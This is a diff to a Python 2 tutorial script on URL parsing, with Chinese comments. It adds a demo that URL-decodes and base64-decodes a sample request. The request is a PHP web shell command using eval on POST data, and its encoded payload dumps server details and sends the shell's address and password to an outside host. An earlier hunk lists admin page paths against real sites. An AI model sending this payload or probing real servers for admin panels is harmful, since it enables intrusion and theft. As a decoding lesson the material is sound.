@@ -3,7 +3,7 @@
 
 #@descript: parser url in python
 import urlparse,sys
-
+import urllib
 ljust = 15
 print "url's standard formart:"
 print "\t scheme://username:password@xx.xx.com:port/pathname/filename?query=value#fargment"
@@ -118,8 +118,15 @@ def demo_decodeURL():
 #==========================================================================================
 def demo_handlerURL():
     list_res =[]
-    list_host =['http://www.baidu.com','http://www.qq.com','http://www.163.com','http://www.jd.com']
-    list_admin =['admin.php','admin.jsp','admin.aspx','/admin/admin.php','/admin/admin.jsp']
+    list_host =['http://www.baidu.com',
+                'http://www.qq.com',
+                'http://www.163.com',
+                'http://www.jd.com']
+    list_admin =['admin.php',
+                 'admin.jsp',
+                 'admin.aspx',
+                 '/admin/admin.php',
+                 '/admin/admin.jsp']
     
     list_url = []
     for host in list_host:
@@ -133,6 +140,43 @@ def demo_handlerURL():
 
     for strs in list_res:
         print strs
+#==========================================================================================
+#@base64
+#演示base64编码URL与解码URL
+#==========================================================================================        
+def  demo_base64():
+    import base64
+    print ""
+    print "在python中使用base64编码和解码是非常容易的.只需import base64"
+    print "然后直接使用encodestring()和decodestring()就可以如果用于除了URL则可以使用"
+    print "urlsafe_b64encode()和urlsafe_b64decode（）"
+    
+    url='''http://www.baidu.com/404.html?a=%24_%3Dstrrev%28edoced_46es
+    ab%29%3B%40eval%28%24_%28%24_POST%5Bz0%5D%29%29%3B
+    &z0=QGV2YWwoYmFzZTY0X2RlY29kZSgnYVdZb0pGOURU
+    MDlMU1VWYkoweDVhMlVuWFNFOU1TbDdjMlYwWTI5dmEybGxLQ2RNZVd0bEp5d3hLVH
+    RBWm1sc1pTZ25hSFIwY0RvdkwzZDNkeTVuYjI5a1pHOW5MbWx1TDBGd2FTNXdhSEEv
+    VlhKc1BTY3VKRjlUUlZKV1JWSmJKMGhVVkZCZlNFOVRWQ2RkTGlSZlUwVlNWa1ZTV3
+    lkU1JWRlZSVk5VWDFWU1NTZGRMaWNtVUdGemN6MG5MbXRsZVNna1gxQlBVMVFwS1R0O
+    ScpKTtAaW5pX3NldCgiZGlzcGxheV9lcnJvcnMiLCIwIik7QHNldF90aW1lX2xpbWl0
+    KDApO0BzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoMCk7ZWNobygiLT58Iik7OyREPWR
+    pcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZG
+    lybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9XHQiO2lmK
+    HN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwp
+    aWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO30kUi49Ilx0IjskdT0oZnVuY3R
+    pb25fZXhpc3RzKCdwb3NpeF9nZXRlZ2lkJykpP0Bwb3NpeF9nZXRwd3VpZChAcG9zaX
+    hfZ2V0ZXVpZCgpKTonJzskdXNyPSgkdSk%2FJHVbJ25hbWUnXTpAZ2V0X2N1cnJlbnR
+    fdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Iih7JHVzcn0pIjtwcmludCAkUjs7ZW
+    NobygifDwtIik7ZGllKCk7'''
+
+    print "原始URL：\n"+url
+    url = urllib.unquote(url)
+    print "经过urldecode解码后:\n"+url
+    index = url.rfind("=")
+    url = url[:index+1] + base64.urlsafe_b64decode(url[index+1:])
+    print "经过base64解码后:\n"+url
+    print "请继续base64.urlsafe_b64decode你会发现一个秘密"   
+        
 if __name__ == "__main__":
     if len(sys.argv) >= 2:
         selfMod =__import__(__name__)
